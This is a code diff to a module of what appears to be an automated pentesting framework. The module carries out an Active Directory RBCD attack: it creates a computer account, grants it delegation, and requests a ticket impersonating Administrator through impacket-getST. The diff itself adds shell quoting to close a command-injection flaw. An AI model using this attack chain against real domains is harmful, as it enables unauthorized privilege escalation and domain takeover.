@@ -1,4 +1,4 @@
-import logging, re
+import logging, re, shlex
 
 from orchestrator.kali_tools_client import kali
 
@@ -11,7 +11,7 @@ class RBCD:
                             domain: str = "", dc_ip: str = "",
                             timeout: int = 120) -> dict:
         """Add a computer account (needed for RBCD attack)."""
-        args = f"ldap {target} -u {username} -p {password}"
+        args = f"ldap {shlex.quote(target)} -u {shlex.quote(username)} -p {shlex.quote(password)}"
         if domain:
             args += f" -d {domain}"
         if dc_ip:
@@ -37,8 +37,8 @@ class RBCD:
         delegate_to: target computer to receive delegation rights (e.g. DC01$)
         computer: attacker-controlled computer account
         """
-        auth = f"-u {username}"
-        auth += f" -p {password}" if password else f" -H {hash}"
+        auth = f"-u {shlex.quote(username)}"
+        auth += f" -p {shlex.quote(password)}" if password else f" -H {shlex.quote(hash)}"
         args = f"ldap {target} {auth}"
         if domain:
             args += f" -d {domain}"
@@ -82,7 +82,7 @@ class RBCD:
             if del_result["success"]:
                 # Request TGS via Impacket getST
                 getst_args = f"{domain}/{target_user}@{delegate_to} -impersonate Administrator -dc-ip {dc_ip or target}"
-                getst_args += f" -hashes :{attacker_password}" if ":" in attacker_password else f" -aesKey {attacker_password}"
+                getst_args += f" -hashes :{shlex.quote(attacker_password)}" if ":" in attacker_password else f" -aesKey {shlex.quote(attacker_password)}"
                 tgs_result = await kali.run("impacket-getST", getst_args, timeout=timeout)
                 stdout = (tgs_result.get("stdout") or "") + (tgs_result.get("stderr") or "")
                 results["get_tgs"] = {
